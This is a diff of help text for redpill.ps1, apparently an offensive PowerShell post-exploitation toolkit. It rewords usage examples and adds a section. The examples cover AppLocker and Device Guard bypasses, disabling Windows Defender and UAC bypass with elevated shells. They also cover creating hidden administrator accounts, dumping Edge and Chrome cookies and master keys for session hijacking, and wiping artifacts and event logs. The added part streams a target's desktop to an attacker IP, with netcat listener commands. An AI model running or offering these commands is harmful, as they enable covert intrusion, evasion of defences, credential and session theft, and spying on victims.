-      PS C:\> .\redpill.ps1 -AppLocker WhoAmi
+      PS C:\> powershell -File redpill.ps1 -AppLocker WhoAmi
       Enumerate ALL Group Names available on local machine
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -AppLocker TestBat
+      PS C:\> powershell -File redpill.ps1 -AppLocker TestBat
       Test AppLocker for Batch script execution bypass (`$ADS)
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -AppLocker "`$Env:TMP\payload.bat"
+      PS C:\> powershell -File redpill.ps1 -AppLocker "`$Env:TMP\payload.bat"
       Execute 'payload.bat' through `$ADS text format bypass technic!
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -AppLocker XmlBypass -Execute "`$PSHome\Powershell.exe"
+      PS C:\> powershell -File redpill.ps1 -AppLocker XmlBypass -Execute "`$PSHome\Powershell.exe"
       Execute 'Powershell.exe' trougth CVE-2018-8492 Windows Device Guard XML bypass!
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -AppLocker XmlBypass -Execute "cmd.exe" -TimeOpen 5
+      PS C:\> powershell -File redpill.ps1 -AppLocker XmlBypass -Execute "cmd.exe" -TimeOpen 5
       Execute 'cmd.exe' trougth CVE-2018-8492 WDG XML bypass! (close cmd after 5 sec)
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -AppLocker XmlBypass -Execute "calc.exe" -Verb True
+      PS C:\> powershell -File redpill.ps1 -AppLocker XmlBypass -Execute "calc.exe" -Verb True
       Skip cmdlet vulnerability tests to execute 'calc.exe' through WDG XML bypass technic!
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -AppLocker Enum -GroupName "BUILTIN\Users" -FolderRigths "Write"
+      PS C:\> powershell -File redpill.ps1 -AppLocker Enum -GroupName "BUILTIN\Users" -FolderRigths "Write"
       Enumerate directorys owned by 'BUILTIN\Users' GroupName with 'Write' permissions active!
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -AppLocker Enum -GroupName "Everyone" -FolderRigths "FullControl"
+      PS C:\> powershell -File redpill.ps1 -AppLocker Enum -GroupName "Everyone" -FolderRigths "FullControl"
       Enumerate directorys owned by 'Everyone' GroupName with 'FullControl' permissions active!
 
    .EXAMPLE
@@ -4163,7 +4477,7 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Author: @Sordum (RedTeam) | @r00t-3xp10it
+      Author: @Sordum {RedTeam} | @r00t-3xp10it
       Disable Windows Defender Service (WinDefend) 
 
    .DESCRIPTION
@@ -4218,7 +4532,7 @@ $HelpParameters = @"
    <#!Help.
    .SYNOPSIS
       Author: @r00t-3xp10it
-      Helper - Query \ Create \ Delete Hidden User Accounts 
+      Helper - Query\Create\Delete Hidden User Accounts!
 
    .DESCRIPTION
       This CmdLet Querys, Creates or Deletes windows hidden accounts.
@@ -4226,9 +4540,9 @@ $HelpParameters = @"
 
    .NOTES
       Required Dependencies: Administrator Privileges on shell
-      Mandatory requirements to {Create|Delete} or set account {Visible|Hidden} state
+      Mandatory requirements to {Create|Delete} or set account {Visible|Hidden}
       The new created user account will be added to 'administrators' Group Name
-      And desktop will allow multiple RDP connections if set -EnableRDP [ True ]
+      And desktop will allow multiple RDP connections if set -EnableRDP 'True'
 
    .Parameter HiddenUser
       Accepts arguments: Query, Verbose, Create, Delete, Visible, Hidden
@@ -4309,10 +4623,10 @@ $HelpParameters = @"
       Accepts arguments: Compile, Execute (default: Execute)
 
    .Parameter Uri
-      URL of Script.cs to be downloaded OR Local script.cs absoluct \ relative path
+      URL of Script.cs to be downloaded OR Local script.cs absoluct\relative path
 
    .Parameter OutFile
-      Standalone executable name to be created plus is absoluct \ relative path
+      Standalone executable name to be created plus is absoluct\relative path
 
    .Parameter IconSet
       Accepts arguments: True or False (default: False)
@@ -4363,8 +4677,8 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Author: @rxwx|@r00t-3xp10it
-      Helper - Edge|Chrome Cookie Hijacking tool!
+      Author: @rxwx | @r00t-3xp10it
+      Helper - Microsoft Edge, Google Chrome Cookie Hijacking tool!
 
    .DESCRIPTION
       To hijack session cookies we first need to dump browser Master Key and the Cookie File.
@@ -4391,11 +4705,11 @@ $HelpParameters = @"
       Dump Microsoft Edge and Google Chrome Master Keys and cookie files 
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -CookieHijack "`$Env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
+      PS C:\> powershell -File redpill.ps1 -CookieHijack "`$Env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
       Dump Microsoft Edge Master Keys and cookie file
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -CookieHijack "`$Env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+      PS C:\> powershell -File redpill.ps1 -CookieHijack "`$Env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
       Dump Google Chrome Master Keys and cookie file
 
    .OUTPUTS
@@ -4428,7 +4742,7 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Author: @_zc00l|@r00t-3xp10it
+      Author: @_zc00l {dll reflection} | @r00t-3xp10it
       Helper - UAC bypass|EOP by dll reflection! (cmstp.exe)
 
    .DESCRIPTION
@@ -4450,27 +4764,27 @@ $HelpParameters = @"
       Delete artifacts left behind by is 'CreationTime' (default: today)
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -UacMe bypass -Execute "regedit.exe"
+      PS C:\> powershell -File redpill.ps1 -UacMe bypass -Execute "regedit.exe"
       Spawns regedit without uac asking for execution confirmation
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "cmd.exe"
+      PS C:\> powershell -File redpill.ps1 -UacMe Elevate -Execute "cmd.exe"
       Local spawns an cmd prompt with administrator privileges! 
    
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "powershell.exe"
+      PS C:\> powershell -File redpill.ps1 -UacMe Elevate -Execute "powershell.exe"
       Local spawns an powershell prompt with administrator privileges!
    
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -UacMe Elevate -Execute "powershell -file `$Env:TMP\DisableDefender.ps1 -Action Stop"
+      PS C:\> powershell -File redpill.ps1 -UacMe Elevate -Execute "powershell -file `$Env:TMP\DisableDefender.ps1 -Action Stop"
       Executes DisableDefender.ps1 script trougth uac bypass module with elevated shell privs {admin}
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -UacMe Clean
+      PS C:\> powershell -File redpill.ps1 -UacMe Clean
       Deletes uac bypass artifacts and powershell eventvwr logs!
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -UacMe Clean -Date "19/04/2021"
+      PS C:\> powershell -File redpill.ps1 -UacMe Clean -Date "19/04/2021"
       Clean ALL artifacts left behind by this cmdlet by is 'CreationTime'
 
    .OUTPUTS
@@ -4521,6 +4835,81 @@ $HelpParameters = @"
       Email             Title              Full Name     Status    Out Of Office  Endpoints
       -----             -----              ---------     ------    -------------  ---------
       test@example.com  Person of Interest J Doe         Offline   False          Work: tel:911
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "LiveStream"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Author: @samratashok (nishang) | @r00t-3xp10it
+      Helper - cmdlet for streaming a target's desktop using MJPEG.
+
+   .DESCRIPTION
+      This script uses MJPEG to stream a target's desktop in real time.
+      A browser which supports MJPEG (Firefox) should then be pointed
+      to the local port sellected by attacker to stream remote desktop.
+
+   .NOTES
+      Mandatory dependencies: A browser which supports MJPEG (Default: Firefox)
+      If attacker sellected -Timmer '0' then stream will stay open until attacker
+      manually stops it using this cmdlet -LiveStream 'Stop' argument, If another
+      Timmer its sellected then this cmdlet will wait -Timmer 'seconds' to stop
+      the streaming and delete ALL artifacts left behind by this function.
+
+   .PARAMETER LiveStream
+      Accepts arguments: Bind, Reverse, Stop (default: Bind)
+
+   .Parameter IPAddress
+      The IP address to connect to when using the -Reverse switch.
+
+   .PARAMETER Port
+      The port to connect to when using the -Reverse switch.
+      When using -Bind it is the port on which this script listens.
+
+   .PARAMETER Timmer
+      The amount of time in seconds to stream (default: 15)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -LiveStream Bind -Port 4321 -Timmer 20
+      Start target desktop live streammimg on port 4321 tcp for 20 seconds time!
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -LiveStream Bind -Port 1234 -Timmer 0
+      Start target desktop live streammimg on port 1234 (but dont stop streaming)
+      Remark: If -Timmer '0' its sellected then manual stream stop its required!
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -LiveStream Reverse -IpAddress 192.168.1.71 -Port 4444
+      Start target desktop live streammimg on port 4444 (port used by reverse tcp shell connection)
+      Remark: The follow netcat syntax can be run on attacker side [ nc -nlvp 4444 | nc -nlvp 9000 ]
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -LiveStream Stop
+      Stop target desktop live streammimg if sellected -Timmer '0' before!
+
+   .OUTPUTS
+      Stream desktop settings
+      --------------------------
+      Target      : 192.168.1.72
+      Lhost       : 192.168.1.71
+      Stream      : Reverse
+      ReversePort : 4444
+      Timmer      : 30 (sec)
+
+      Creating trigger.ps1 to import \ run module on a diferent process! (child)
+      Executing Start-Process to run module in a new powershell process! (child)
+      -----------------------------------------------------------------------------
+      Start firefox on attacker side on: http://192.168.1.71:4444 to access stream!
+      -----------------------------------------------------------------------------
+      Streaming remote target desktop for: 30 seconds!
+      Stoping process Id: 49392 (LiveStream)
+      Deleting ALL artifacts left behind!
+
+   .LINK
+      https://www.labofapenetrationtester.com/2015/12/stream-targets-desktop-using-mjpeg-and-powershell.html
    #>!bye..
 
 "@;
